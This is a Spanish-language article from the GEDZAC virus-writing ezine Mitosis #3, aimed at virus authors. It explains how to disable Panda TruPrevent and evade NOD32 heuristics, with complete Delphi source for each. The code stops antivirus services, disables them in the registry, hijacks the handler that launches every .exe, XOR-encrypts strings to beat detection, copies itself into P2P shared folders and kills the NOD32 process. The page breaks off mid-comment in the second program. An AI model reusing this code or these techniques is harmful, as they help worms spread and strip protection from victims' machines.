<html>

<head>
<meta http-equiv="Content-Language" content="es-ve">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Articulo 1</title>
</head>

<body bgcolor="#000000">

<p><font size="2" color="#0099FF">***************************************************************************************************</font><font size="2"><font color="#FF0000"><br>
</font><font color="#0099FF">*************************************</font><font color="#008000">Analizando 
y Eliminando</font><font color="#0099FF">*******************************************</font><font color="#FF0000"><br>
</font><font color="#0099FF">**************************************</font><font color="#008000">Tecnologías 
Antivirales </font><font color="#0099FF">
*******************************************<br>
*************************</font><font color="#008000">Basadas en la emulación de 
código y la heurística avanzada</font><font color="#0099FF">*****************************<br>
**************************************</font><font color="#008080">Byt3Cr0w/GEDZAC</font><font color="#0099FF">*********************************************</font><font color="#FF0000"><br>
</font><font color="#0099FF">
***************************************************************************************************</font></font><font size="2" color="#FF0000"><br>
<br>
Actualmente cada día se avanza mas en aspectos de seguridad informática, ya sea 
creando módulos heurísticas avanzados como<br>
por ejemplo el ya bastantes veces aclamado y premiado modulo de heurística de 
NOD32, o tratando de detectar nuevas amenazas<br>
ejecutando los archivos en una maquina virtual donde se emula al sistema 
operativo del usuario y se buscan en el cambios <br>
realizados por el fichero.<br>
<br>
Existen en este momento varios programas los cuales detectan nuevas amenazas 
basándose en el sistema anteriormente comentado,<br>
uno de ellos es <u>Panda TruPrevent</u> (actualmente no oficial (<u>09/12/2004</u>)).<br>
<br>
Después de enterarme de que existía esta tecnología me negaba a crear su 
publicidad la cual se centraba en el hecho<br>
de detectar nuevas amenazas ya sean virus, worms, malwares o de otro tipo sin 
utilizar bases de datos ni heurística<br>
y el hecho de emular una maquina virtual donde se ejecutaría el archivo y se 
analizarían sus acciones en un corto periodo<br>
de tiempo, al escuchar esto lo primero que se me vino a la cabeza fue toda la 
memoria que podría consumir analizando un <br>
archivo.<br>
<br>
Luego de escuchar en varias ocasiones que esta tecnología acabaría con los 
futuros worms o virus, me propuse estudiarla<br>
además de la supuesta gran heurística de NOD32.<br>
&nbsp;</font></p>
<p><font size="2" color="#0099FF">**************************************************************************************************</font><font size="2"><font color="#FF0000"><br>
</font><font color="#0099FF">*****************************************</font><font color="#008000">Analizando 
y Eliminando</font><font color="#0099FF">***************************************</font><font color="#FF0000"><br>
</font><font color="#0099FF">*******************************************</font><font color="#008000">Panda 
TruPrevent</font><font color="#0099FF">******************************************<br>
********************</font><u><font color="#006666">(MÉTODO POSIBLEMENTE NO 
COMPATIBLE CON WINDOWS 9x)</font></u><font color="#0099FF">********************</font><font color="#FF0000"><br>
</font><font color="#0099FF">
***************************************************************************************************<br>
<br>
</font></font><font size="2" color="#FF0000">Lo primero es saber si esta tecnología funciona y 
es tan buena como lo indica su publicidad, para esto he testeado con 8 tipos<br>
de amenazas estas están conformadas por 8 diferentes worms/virus:</font></p>
<p><font color="#FF0000" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img border="0" src="A1_P4.JPG" width="667" height="547"><br>
<br>
Como podemos ver los 8 worm/virus fueron detectados bloqueados o desinfectados, 
4 de estos 8 eran proyectos virales nuevos<br>
y no fueron detectados por ningún Antivirus (Escaneados con:&nbsp; NOD32, KAV, 
DrWeb,&nbsp; NVC, F-PROT), con esta prueba ya <br>
sabemos que TruPrevent funciona.<br>
<br>
TruPrevent usa un sistema de protección (avanzado en comparación con algunos 
Antivirus) el cual previene que se pueda<br>
modificar alguna llave/clave del registro que pueda afectar al funcionamiento de 
TruPrevent, igualmente evita que<br>
se puedan cerrar sus procesos a través de cualquier programa (Esto incluye al 
taskmgr de Windows).<br>
<br>
El sistema de protección para evitar que podamos modificar/eliminar realiza 
varias acciones sobre todas las llaves <br>
del registro que TruPrevent desea proteger.</font></p>
<p><font color="#FF0000" size="2">
<img border="0" src="A1_P2x.JPG" width="826" height="141"><br>
<br>
<br>
Estas acciones las realiza de forma repetitiva logrando de esta manera que 
modificar o borrar cualquier llave o valor del <br>
registro relacionado con TruPrevent sea difícil (o imposible) ya que estas están 
siendo usadas por el programa protector.<br>
<br>
De manera similar TruPrevent para evitar que sus procesos sean terminados, 
realiza acciones repetitivamente sobre archivos<br>
que en general no existen.<br>
<br>
<img border="0" src="A1_P3x.JPG" width="938" height="113"><br>
<br>
TruPrevent nos ha quitado por ahora la posibilidad de jugar con sus llaves y 
valores en el registro al igual que<br>
la posibilidad de cerrar sus procesos, en este momento ya deberíamos de estar 
pensando usar la fuerza bruta<br>
<br>
<u><b>- Borrar directorio de TruPrevent<br>
- Borrar los archivos Signatures (Base de datos virales)<br>
- Etc...<br>
</b></u>
<br>
Aunque esto pueda sonar rápido, sencillo y sin complicaciones pues 
lamentablemente no podrás hacerlo ya que el<br>
directorio donde se encuentra TruPrevent instalado (y los archivos Signatures) 
esta protegido por el mismo TruPrevent.<br>
<br>
En conclusión mientras se este ejecutando TruPrevent es bastante dificultoso (o 
imposible) afectar el funcionamiento de este.<br>
<br>
Así que la solución seria simplemente evitar que se ejecutara el TruPrevent al 
inicio de Windows y de esta manera tendríamos <br>
el camino libre para hacer lo que quisiéramos.<br>
<br>
Para ejecutarse en cada inicio TruPrevent al instalarse crea las siguientes 
llaves en el registro:<br>
<b>
<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APVXDWIN<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LUPGCONF<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavProt<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavFnSvr<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Panda 
Preventium Service<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavFires<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavKRE<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavKRE9x<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PavProt9<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Panda 
Preventium+ Service</b><br>
<br>
Naturalmente para poder evitar que se ejecuta al inicio tendríamos que borrar o 
modificar de alguna manera esas<br>
llaves pero esto no es posible.<br>
<br>
El funcionamiento de TruPrevent esta constituido y basado en varios servicios<br>
&nbsp;</font></p>
<p><font size="2"><img border="0" src="A1_P1.JPG" width="723" height="393"></font><font size="2" color="#FF0000"><br>
<br>
<b><u>- Panda Function Service<br>
- Panda IManager Service<br>
- Panda Pavkre<br>
- Panda PavProt<br>
- Panda Preventium+ Service<br>
- Panda Process Protection Service</u><br>
</b><br>
Para nuestra sorpresa podemos usar el comando: net stop, para poder detener los 
servicios del TruPrevent<br>
al detener estos servicios prácticamente TruPrevent queda desnudo e indefenso 
basta con detener alguno de los<br>
siguientes servicios:<br>
<br>
<u>
<b>- Panda Function Service<br>
- Panda Pavkre<br>
- Panda PavProt<br>
</b></u>
<b><u>- Panda Preventium+ Service</u></b><br>
<br>
Luego de detener alguno de estos servicios debemos modificar el registro para 
evitar que en cada inicio se ejecuten los<br>
servicios y al no ejecutarse los servicios Panda TruPrevent no se ejecutara y 
nuestro virus tendra el camino libre<br>
en la maquina del infectado.<br>
<br>
Llaves a modificar:<br>
<br>
<b>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PAVfnsvr\START = 4<span lang="es-ve">
</span>
</b>
</font><font size="2">
<b>
<span lang="es-ve"><font color="#0099FF">
(Hexadecimal = </font><font color="#008000">
DWORD</font><font color="#0099FF">)</font></span><font color="#FF0000"><br>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Pavkre\START = 4<span lang="es-ve">
</span></font><span lang="es-ve"><font color="#0099FF">
(Hexadecimal = </font><font color="#008000">
DWORD</font><font color="#0099FF">)</font></span><font color="#FF0000"><br>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PavProc\START = 4<span lang="es-ve">
</span></font><span lang="es-ve"><font color="#0099FF">
(Hexadecimal = </font><font color="#008000">
DWORD</font><font color="#0099FF">)</font></span><font color="#FF0000"><br>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PavProt\START = 4 </font>
<span lang="es-ve"><font color="#0099FF">
(Hexadecimal = </font><font color="#008000">
DWORD</font><font color="#0099FF">)</font></span><font color="#FF0000"><br>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ \START = 4<span lang="es-ve">
</span></font><span lang="es-ve"><font color="#0099FF">
(Hexadecimal = </font><font color="#008000">
DWORD</font><font color="#0099FF">)</font></span><font color="#FF0000"><br>
</font>
</b>
<font color="#FF0000">
<br>
Al hacer esto en el próximo inicio de Windows no se ejecutaran los servicios del 
TruPrevent pero todavía queda <br>
existiendo la llave:<br>
<br>
<b>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APVXDWIN</b><br>
<br>
La cual no podemos modificar ni eliminar (con o sin los servicios ejecutándose), 
esta llave nos echaría a perder nuestro<br>
trabajo ya que ella ejecuta al TruPrevent en si que seria el archivo 
&quot;<u><b>APVXDWIN.EXE</b></u>&quot; ubicado en la carpeta de instalación.<br>
<br>
Para evitar la ejecución debemos de modificar la llave:<br>
<br>
<b>HKEY_CLASSES_ROOT\exefile\shell\open\command</b><br>
<br>
Para de esta manera hacer que nuestro virus intercepte a los archivos 
ejecutables (.EXE) antes de ejecutarse,<br>
nuestro virus examinara el nombre del archivo que necesita ejecutarse si el 
archivo tiene como nombre: &quot;<b>APVXDWIN.EXE</b>&quot;<br>
el virus no lo ejecutara y de esta manera evitaremos completamente la presencia 
del TruPrevent en la memoria (debemos de <br>
ejecutar los demás archivos ejecutables, este tema esta mejor explicado en el 
artículos &quot;<a href="http://gedzac.gratishost.com/articulos/interexe.zip"><font color="#FF0000">Interceptar 
Ejecutables</font></a>&quot; escrito por MachineDramon/GEDZAC)<br>
<br>
Codigo de ejemplo (Delphi):<br>
<br>
<b>[</b><br>
</font><font color="#008000">program Kill_TruPrevent;<br>
<br>
</font><font color="#0099FF">{ TruPrevent Killer Example for the Mitosis #3 
Ezine by: Byt3Cr0w/GEDZAC }</font><font color="#008000"><br>
<br>
<b>uses</b><br>
windows;<br>
<br>
<b>Const</b><br>
NS1 = 'cmd.exe /c net stop &quot;Panda Function Service&quot;';<br>
NS2 = 'cmd.exe /c net stop &quot;Panda Pavkre&quot;';<br>
NS3 = 'cmd.exe /c net stop &quot;Panda PavProt&quot;';<br>
<br>
RG = 'SYSTEM\CurrentControlSet\Services\';<br>
RG1 = RG+'PAVfnsvr';<br>
RG2 = RG+'Pavkre';<br>
RG3 = RG+'PavProc';<br>
RG4 = RG+'PavProt';<br>
RG5 = RG+'PavPrSrv';<br>
<br>
</font><b><font color="#008080">Procedure Rwrite(O:String);</font></b><font color="#008000"><br>
<b>var</b> <b><br>
Reg:Hkey;<br>
Hexa:Cardinal;</b><br>
</font><b><font color="#008080">Begin</font></b><font color="#008000"><br>
Hexa := $4;<br>
RegOpenKeyEx(HKEY_LOCAL_MACHINE,Pchar(O),1,KEY_ALL_ACCESS,Reg);<br>
RegSetValueEx(Reg,Pchar('Start'),0,REG_DWORD,@Hexa,SizeOf(Cardinal));<br>
RegCloseKey(Reg);<br>
</font><b><font color="#008080">End;<br>
</font></b><font color="#008000"><br>
</font><b><font color="#008080">Procedure NETSTOP;</font></b><font color="#008000"><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
WinExec(Pchar(NS1),SW_HIDE);<br>
sleep(2000); </font><font color="#0099FF">//Esperamos a que se detenga el 
servicio...</font><font color="#008000"><br>
WinExec(Pchar(NS2),SW_HIDE);<br>
sleep(2000); </font><font color="#0099FF">//Esperamos a que se detenga el 
servicio...</font><font color="#008000"><br>
WinExec(Pchar(NS3),SW_HIDE);<br>
sleep(2000); </font><font color="#0099FF">//Esperamos a que se detenga el 
servicio...</font><font color="#008000"><br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
<br>
</font><font color="#008080"><b>Procedure ModReg;<br>
begin</b></font><font color="#008000"><br>
Rwrite(RG1);<br>
Rwrite(RG2);<br>
Rwrite(RG3);<br>
Rwrite(RG4);<br>
Rwrite(RG5);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
<br>
</font><b><font color="#008080">Procedure ExeReg;</font></b><font color="#008000"><br>
<b>var<br>
&nbsp;Reg:Hkey;<br>
Pam:string;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
Pam := paramstr(0)+' &quot;%1&quot;';<br>
RegOpenKeyEx(HKEY_CLASSES_ROOT,Pchar('exefile\shell\open\command'),1,KEY_ALL_ACCESS,Reg);<br>
RegSetValueEx(Reg,Pchar(''),0,REG_SZ,Pchar(Pam),Length(Pam));<br>
RegCloseKey(Reg);<br>
</font><b><font color="#008080">end;<br>
</font></b><font color="#008000"><br>
<br>
</font><b><font color="#008080">function FileName(m:string):string;</font></b><font color="#008000"><br>
<b>var<br>
&nbsp;i:integer;<br>
a,b:string;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
for i := Length(m) downto 0 do if m[i] = '\' then break else a := a + m[i]; 
i:=0;<br>
for i := Length(a) downto 0 do b:=b+a[i];<br>
Result := b;<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
<br>
<br>
</font><b><font color="#008080">begin</font><font color="#008000"><br>
</font></b><font color="#00FFFF">NetStop;<br>
ModReg;<br>
ExeReg;</font><font color="#008000"><br>
if paramstr(1) ='' then exitprocess(0);<br>
if FileName(paramstr(1)) ='<u><b>APVXDWIN.EXE</b></u>' then exitprocess(0);<br>
WinExec(Pchar(paramstr(1)),SW_SHOWNORMAL);<br>
</font><b><font color="#008080">end.</font></b></font><font size="2" color="#FF0000"><br>
<br>
<b>]</b><br>
&nbsp;</font></p>
<p><font size="2" color="#0099FF">***************************************************************************************************</font><font size="2"><font color="#FF0000"><br>
</font><font color="#0099FF">*****************************************</font><font color="#008000">Evadiendo 
&amp; Eliminando</font><font color="#0099FF">***************************************</font><font color="#FF0000"><br>
</font><font color="#0099FF">****************************************</font><font color="#008000">Modulo 
Heuristico NOD32</font><font color="#0099FF">**************************************</font><font color="#FF0000"><br>
</font></font><font size="2" color="#0099FF">***************************************************************************************************</font></p>
<p><font color="#FF0000" size="2">Este modulo Heuristico es el que ha ganado mas años 
seguidos virus &quot;in the wild&quot; que son test objetivos no remunerados por ninguna 
compañia<br>
personalmente he probado numerosos productos de este tipo:</font></p>
<p><b><font color="#FF0000" size="2">&nbsp;&nbsp;&nbsp;&nbsp; - Kaspersky AntiVirus <br>
&nbsp;&nbsp;&nbsp;&nbsp; - Symantec Norton Antivirus<br>
&nbsp;&nbsp;&nbsp;&nbsp; - Panda Titanium <br>
&nbsp;&nbsp;&nbsp;&nbsp; - Sophos AntiVirus<br>
&nbsp;&nbsp;&nbsp;&nbsp; - F-Prot<br>
&nbsp;&nbsp;&nbsp;&nbsp; - Norman Virus Control<br>
&nbsp;&nbsp;&nbsp;&nbsp; - Sybari<br>
&nbsp;&nbsp;&nbsp;&nbsp; - BitDefender<br>
&nbsp;&nbsp;&nbsp;&nbsp; - ClamWin</font></b></p>
<p><font color="#FF0000" size="2">Ninguno de los mencionados posee una heurística tan 
compleja y precisa como la de NOD (producto de la compañía ESET) <br>
la mayoría de los virus/worms luego de ser compilados son detectados 
heuristicamente por NOD, ya sean virus infectores o worms.<br>
<br>
La detección heurística generalmente se basa en las <u>Strings</u> que contiene 
el virus, el modulo heuristico lee y analiza las Strings<br>
encontradas y si estas son sospechosas entonces NOD detectara al archivo como:
<br>
&quot;<u><b>Probably unknown NewHeur_PE Virus</b></u>&quot; = &quot;Probable virus nuevo&quot;<br>
<br>
Generalmente las strings mas sospechosas son las que mencionan 
directorios de populares programas P2P.</font></p>
<p><font color="#FF0000" size="2">Para evitar esto bastaría con solo aplicar un simple 
método que seria encriptar las strings de nuestro virus, al aplicar esto a 
nuestro<br>
virus el modulo heuristico no tendrá efecto (en la mayoría de los casos)&nbsp; 
ya que las strings no tendrían sentido alguno.<br>
<br>
Este método no es difícil de aplicar a nuestros virus , veamos la idea 
principal de un programa encriptador de Strings:</font></p>
<p><font size="2"><img border="0" src="A1_P5.JPG" width="802" height="593"><br>
<font color="#008000"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Diagrama de flujo (flowchart) con Símbolos&nbsp; estándar normalizados por ANSI.<br>
<br>
</b></font></font><font size="2" color="#FF0000">Básicamente tendría que funcionar de una manera 
muy similar pero nuestro virus solo debería de cumplir la función de 
desencriptar las Strings
y luego usarlas normalmente.<br>
<br>
Ejemplo practico&nbsp; (Delphi):</font></p>
<p><font size="2" color="#0099FF">{ Ejemplo para la Mitosis #3 por Byt3Cr0w/GEDZAC}<br>
{ Evasion y eliminacion del modulo heuristico NOD32 }<br>
</font><font size="2"><font color="#008000"><br>
<b>program Kill_NOD32;</b><br>
<b>uses</b><br>
windows,TLHelp32,SysUtils;<br>
<b>const</b><br>
PROCESS_TERMINATE=$0001;<br>
<b>var F:Array[1..8] of string;<br>
M:Array[1..2] of string;<br>
R:Array[1..3] of string;<br>
A:string;<br>
</b>
<br>
</font><font color="#0099FF">//Inicio de la rutina para terminar programas que 
se encuentren en ejecucion...</font><font color="#008000"><br>
</font><b><font color="#008080">procedure TerminaProceso(NombreDelArchivo:string);</font></b><font color="#008000"><br>
<b>var<br>
ElLoop:bool;<br>
MiFoto:thandle;<br>
EntradaDelProceso:tprocessentry32;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
MiFoto:=createtoolhelp32snapshot(th32cs_snapprocess,0);<br>
EntradaDelProceso.dwSize:=Sizeof(EntradaDelProceso);<br>
ElLoop:=Process32First(MiFoto,EntradaDelProceso);<br>
while integer(ElLoop)&lt;&gt;0 do begin<br>
if ((upperCase(extractfilename(EntradaDelProceso.szexefile))=UpperCase(NombreDelArchivo)) 
or (UpperCase(EntradaDelProceso.szExeFile)=UpperCase(NombreDelArchivo))) then<br>
terminateprocess(OpenProcess(process_terminate,bool(0),EntradaDelProceso.th32ProcessID),0);<br>
ElLoop:= process32Next(MiFoto,EntradaDelProceso);<br>
end;<br>
CloseHandle(MiFoto);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
<br>
</font><font color="#0099FF">//Inicio de la rutina para copiar nuestro programa 
a diferentes carpetas P2P...</font><font color="#008000"><br>
</font><b><font color="#008080">procedure CopyFiles;</font></b><font color="#008000"><br>
<b>var contador:integer;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
for contador := 1 to 8 do CopyFile(Pchar(paramstr(0)),Pchar(F[contador]),true);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la Rutina...</font><font color="#008000"><br>
</font><font color="#0099FF"><br>
//Inicio de la rutina para mostrar mensaje...</font><font color="#008000"><br>
</font><b><font color="#008080">procedure ShowMessage;</font></b><font color="#008000"><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
MessageBox(0,Pchar(M[1]),Pchar&nbsp;&nbsp;&nbsp; (M[2]),0);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
</font><font color="#0099FF">//Inicio de la rutina para desencriptar las strings...</font><font color="#008000"><br>
</font><b><font color="#008080">Function decrypt(cadena:string):string;</font></b><font color="#008000"><br>
<b>var desencriptado:string;<br>
count1,count2,llave:integer;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
llave := 6;</font><font color="#0099FF"> //La llave de encriptacion en este caso 
es = 6</font><font color="#008000"><br>
count1 := Length(cadena);<br>
for count2 := 1 to count1 do desencriptado := desencriptado + 
chr(ord(cadena[count2]) xor llave);<br>
Result := desencriptado;<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
</font><font color="#0099FF">//Inicio de la rutina de desencriptacion general...</font><font color="#008000"><br>
</font><b><font color="#008080">procedure DecryptStrings;</font></b><font color="#008000"><br>
<b>var contador:integer;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
for contador := 1 to 8 do F[contador] := decrypt(F[contador]);<br>
for contador := 1 to 2 do M[contador] := decrypt(M[contador]);<br>
for contador := 1 to 3 do R[contador] := decrypt(R[contador]);<br>
A := decrypt(A);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
</font><font color="#0099FF">//Inicio de la rutina para modificar el registro...</font><font color="#008000"><br>
</font><b><font color="#008080">Procedure ExeReg;</font></b><font color="#008000"><br>
<b>var Reg:Hkey;</b><br>
<b>Pam:string;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
Pam := paramstr(0)+R[1];<br>
RegOpenKeyEx(HKEY_CLASSES_ROOT,Pchar(R[2]),1,KEY_ALL_ACCESS,Reg);<br>
RegSetValueEx(Reg,Pchar(''),0,REG_SZ,Pchar(Pam),Length(Pam));<br>
RegCloseKey(Reg);<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
</font><font color="#0099FF">//Inicio de la rutina para extraer el nombre del 
archivo a ejecutar...</font><font color="#008000"><br>
</font><b><font color="#008080">function FileName(m:string):string;</font></b><font color="#008000"><br>
<b>var i:integer;<br>
a,b:string;</b><br>
</font><b><font color="#008080">begin</font></b><font color="#008000"><br>
for i := Length(m) downto 0 do if m[i] = R[3] then break else a := a + m[i]; 
i:=0;<br>
for i := Length(a) downto 0 do b:=b+a[i];<br>
Result := b;<br>
</font><b><font color="#008080">end;</font></b><font color="#008000"><br>
</font><font color="#0099FF">//Fin de la rutina...</font><font color="#008000"><br>
<br>
</font><b><font color="#008080">begin<br>
</font></b><font color="#008000"><br>
</font><font color="#0099FF">
/////////////////////////////////////////////////////////////////////////////////////////////////////<br>
//------------------------------------------------------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Strings Desencriptadas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|-----------------------------------------------------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\WinMX\Shared\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\Kazaa\My Shared Folder\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\Grokster\My Grokster\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\ICQ\Shared Folder\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\Bearshare\Shared\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\eMule\Incoming\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\Morpheus\My Shared Folder\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- C:\Archivos de programa\LimeWare\Shared\Ejemplo.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
//|- Por Byt3Cr0w/GEDZAC 2004&nbsp; <br>
//|- [ Ejemplo para la Mitosis#3 ] <br>
//|- &quot;%1&quot;<br>
//|- exefile\shell\open\command <br>
//|- \ |//<br>
//|- nod32kui.exe <br>
//|----------------------------------------------------------------|<br>
////////////////////////////////////////////////////////////////////////////////////////////////////</font><font color="#008000"><br>
</font><font color="#0099FF"><br>
// Strings encriptadas...<br>
</font><font color="#008000"><br>
<b>F[1] := </b>'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZQohK^ZUngtcbZClckvji(c~c';<br>
<b>F[2] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZMg|ggZK&#127;&amp;Ungtcb&amp;@ijbctZClckvji(c~c';<br>
<b>F[3] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZAtimurctZK&#127;&amp;AtimurctZClckvji(c~c';<br>
<b>F[4] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZOEWZUngtcb&amp;@ijbctZClckvji(c~c';<br>
<b>F[5] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZDcgtungtcZUngtcbZClckvji(c~c';<br>
<b>F[6] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZcKsjcZOheikohaZClckvji(c~c';<br>
<b>F[7] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZKitvncsuZK&#127;&amp;Ungtcb&amp;@ijbctZClckvji(c~c';<br>
<b>F[8] :=</b> 'E&lt;ZGtenopiu&amp;bc&amp;vtiatgkgZJokcQgtcZUngtcbZClckvji(c~c';<br>
<b>M[1] :=</b> 'Vit&amp;D&#127;r5Et6q)ACB\GE&amp;4662';<br>
<b>M[2] :=</b> ']&amp;Clckvji&amp;vgtg&amp;jg&amp;Koriuou%5&amp;[';<br>
<b>R[1] := </b>'&amp;$#7$';<br>
<b>R[2] :=</b> 'c~c`ojcZuncjjZivchZeikkghb';<br>
<b>R[3] :=</b> 'Z';<br>
<b>A:= </b>'hib54mso(c~c';<br>
//-----------------------------<br>
</font><font color="#00FFFF">DecryptStrings;</font><font color="#008000"> </font>
<font color="#0099FF">//Desencriptamos las strings...</font><font color="#008000"><br>
</font><font color="#00FFFF">CopyFiles;</font><font color="#008000"> </font>
<font color="#0099FF">//Copiamos archivos...<br>
</font>
<font color="#00FFFF">ExeReg;</font><font color="#008000"> </font>
<font color="#0099FF">//Modificamos el registro...</font><font color="#008000"><br>
</font><font color="#00FFFF">ShowMessage;</font><font color="#008000"> </font>
<font color="#0099FF">//Mostramos mensaje..</font><font color="#008000">.<br>
</font><font color="#00FFFF">TerminaProceso(A);</font><font color="#008000">
</font><font color="#0099FF">//Eliminamos de la memoria a NOD32</font><font color="#008000"><br>
if paramstr(1) ='' then exitprocess(0); </font><font color="#0099FF">//Si no 
